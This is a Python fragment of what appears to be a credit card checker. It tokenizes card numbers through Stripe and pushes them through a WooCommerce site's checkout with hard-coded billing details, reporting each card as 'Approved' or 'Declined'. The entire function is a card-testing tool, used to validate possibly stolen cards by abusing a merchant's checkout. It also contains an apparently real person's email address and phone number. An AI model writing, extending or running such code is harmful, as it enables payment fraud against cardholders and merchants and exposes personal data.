...
def stripe_charge(ccx):
	...
	try:
		parts = ccx.split('|')
		if len(parts) != 4: return "Invalid Card Format"
		n, mm, yy, cvc = parts[0].replace(' ', ''), parts[1].zfill(2), parts[2], parts[3].replace('\n', '')
		if len(yy) == 4: yy = yy[-2:]
	except: return "Invalid Card Format"
	...
	stripe_headers = {'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0'}
	stripe_data = {'card[number]': n, 'card[exp_month]': mm, 'card[exp_year]': yy, 'card[cvc]': cvc, 'key': stripe_pk}

	try:
		r1 = session.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=15).json()
		if 'id' not in r1: return f"Declined: {r1.get('error', {}).get('message', 'Token Error')}"
		token_id = r1['id']
	except: return "Connection Error on Stripe"

	checkout_url = f'{site_url}/?wc-ajax=checkout'
	checkout_data = {
		'billing_email': 'eslamramadanv1@gmail.com',
		'billing_first_name': 'Eslam', 'billing_last_name': 'Ramadan',
		'billing_country': 'GB', 'billing_address_1': 'new yirl', 'billing_city': 'new york',
		'billing_postcode': 'EC1A 1BB', 'billing_phone': '+201153262807',
		'payment_method': 'stripe', 'stripe_token': token_id, 'terms': 'on'
	}
	
	try:
		r2 = session.post(checkout_url, data=checkout_data, timeout=15).json()
		messages = str(r2.get('messages', ''))
		if "success" in str(r2.get('result', '')): return "Approved"
		return f"Declined: {re.sub(r'<[^>]+>', '', messages)}"
	except: return "Error in Checkout"
